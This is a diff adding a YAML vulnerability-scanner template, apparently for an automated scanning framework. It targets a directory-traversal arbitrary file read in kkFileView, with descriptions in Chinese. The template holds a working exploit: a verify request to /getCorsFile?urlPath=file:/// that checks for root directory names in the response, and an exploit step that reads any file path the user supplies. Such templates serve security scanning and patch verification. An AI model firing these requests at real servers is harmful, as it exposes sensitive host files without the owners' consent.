@@ -1,0 +1,55 @@
+app: kkFileView
+query: app:"kkFileView"
+meta:
+    name: kkFileview 任意文件读取
+    level: 3
+    tags:
+        - file_read
+    description: Keking kkFileview 存在安全漏洞，该漏洞源于存在通过目录遍历漏洞读取任意文件，可能导致相关主机上的敏感文件泄漏。
+    homepage: http://kkfileview.keking.cn/
+    author: Administrator
+    references: https://blog.csdn.net/nnn2188185/article/details/130383820
+    solution: 目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://github.com/kekingcn/kkFileView/issues/304
+    create_at: "2023-09-21 10:26:17"
+    available: true
+    steps:
+        variable: []
+        verify_steps:
+            type: and
+            verify:
+                - request:
+                    method: GET
+                    path: /getCorsFile?urlPath=file:///
+                    redirect: true
+                    header: []
+                    params: ""
+                  response:
+                    - name: code
+                      value: "200"
+                      type: equals
+                    - name: body
+                      value: root
+                      type: contains
+                    - name: body
+                      value: opt
+                      type: contains
+                    - name: body
+                      value: usr
+                      type: contains
+        exploit_steps:
+            type: and
+            params:
+                name: File
+                type: input
+                value: file:///
+            exploit:
+                - request:
+                    method: GET
+                    path: /getCorsFile?urlPath={{exploit}}
+                    redirect: true
+                    header: []
+                    params: ""
+                  response:
+                    - name: code
+                      value: "200"
+                      type: equals
